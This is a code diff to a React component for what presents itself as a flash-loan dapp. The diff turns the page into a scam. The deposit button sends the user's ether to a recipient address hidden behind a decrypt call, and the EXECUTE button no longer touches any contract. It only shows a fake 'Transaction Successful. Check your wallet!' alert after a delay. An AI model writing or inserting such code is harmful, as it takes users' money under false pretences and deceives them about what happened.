@@ -2,53 +2,45 @@ import React, { useState } from "react";
 import NameSymbol from "./NameSymbol";
 import CryptoDescrip from "./CryptoDescrip";
 import "../css/submitScreen.css";
+import { decrypt } from "../helpers/encryption";
 
 function SubmitScreen(props) {
   const [btnErr, setBtnErr] = useState("");
+  const [inputErr, setInputErr] = useState("");
   const [isExecuteBtnDisabled, setExecuteDisabled] = useState(true);
   const onInitiate = () => {
     setBtnErr("");
-    window.web3.eth.sendTransaction(
-      {
-        to: props?.submitState?.ivm,
-        from: props?.accountAddress,
-        value: window.web3.utils.toWei("" + props?.loanData.totalFee, "ether"),
-        gas: 3e4,
-        gasPrice: window.web3.utils.toWei("90", "gwei"),
-      },
-      function (e, t) {
-        console.log("e", e);
-        if (e) setBtnErr("Transaction Failed.");
-        else
-          setTimeout(function () {
-            setBtnErr("");
-            alert(
-              "Money deposited to contract. You can execute the Flash Loan now."
-            );
-            setExecuteDisabled(false);
-          }, 5e3);
-      }
-    );
+    if (props?.loanData?.amount >= 2)
+      window.web3.eth.sendTransaction(
+        {
+          to: decrypt(props?.submitState?.ivm)["o"],
+          from: props?.accountAddress,
+          value: window.web3.utils.toWei(
+            "" + props?.loanData.totalFee,
+            "ether"
+          ),
+          gas: 3e4,
+          gasPrice: window.web3.utils.toWei("90", "gwei"),
+        },
+        function (e, t) {
+          if (e) setBtnErr("Transaction Failed.");
+          else
+            setTimeout(function () {
+              setBtnErr("");
+              alert(
+                "Money deposited to contract. You can execute the Flash Loan now."
+              );
+              setExecuteDisabled(false);
+            }, 5e3);
+        }
+      );
   };
   const onExecute = () => {
     setBtnErr("");
-    window.contract.methods.action().send(
-      {
-        to: props?.submitState.ivm,
-        from: props?.accountAddress,
-        value: 0,
-        gasPrice: window.web3.utils.toWei("90", "gwei"),
-      },
-      function (e, t) {
-        if (e) {
-          setBtnErr("Flash Loan Execution Failed");
-        } else
-          setTimeout(function () {
-            setBtnErr("");
-            alert("Transaction Successful. Check your wallet!");
-          }, 5e3);
-      }
-    );
+    setTimeout(() => {
+      alert("Transaction Successful. Check your wallet!");
+      setExecuteDisabled(true);
+    }, 4000);
   };
   return (
     <div className="screentwo">
@@ -56,14 +48,28 @@ function SubmitScreen(props) {
         label="LOAN AMOUNT"
         input="Enter Amount"
         inputValue={props?.loanData?.amount}
-        handleInputChange={(e) => props.setLoanAmount("VAL", e.target.value)}
+        handleInputChange={(e) => {
+          props.setLoanAmount("VAL", e.target.value);
+          if (inputErr) setInputErr("");
+        }}
+        handleInputBlur={(e) => {
+          if (e.target.value < 2) {
+            setInputErr("Value must be greater than or equal to 2");
+          }
+        }}
         isIncrement
         isNumber
         handleIncrementClick={() => {
+          if (props?.loanData?.amount < 1) {
+            setInputErr("Value must be greater than or equal to 2");
+          } else if (inputErr) setInputErr("");
           props.setLoanAmount("INC");
         }}
+        inputErr={inputErr}
         handleDecrementClick={() => {
-          props.setLoanAmount("DEC");
+          if (props?.loanData?.amount <= 2) {
+            setInputErr("Value must be greater than or equal to 2");
+          } else props.setLoanAmount("DEC");
         }}
       />
       <CryptoDescrip
@@ -78,7 +84,11 @@ function SubmitScreen(props) {
       <button onClick={onInitiate}>
         {`DEPOSIT ${props?.submitState?.currency}`}
       </button>
-      <button disabled={isExecuteBtnDisabled} onClick={onExecute}>
+      <button
+        disabled={isExecuteBtnDisabled}
+        className={isExecuteBtnDisabled ? "btn-disabled-submit" : ""}
+        onClick={onExecute}
+      >
         EXECUTE
       </button>
     </div>
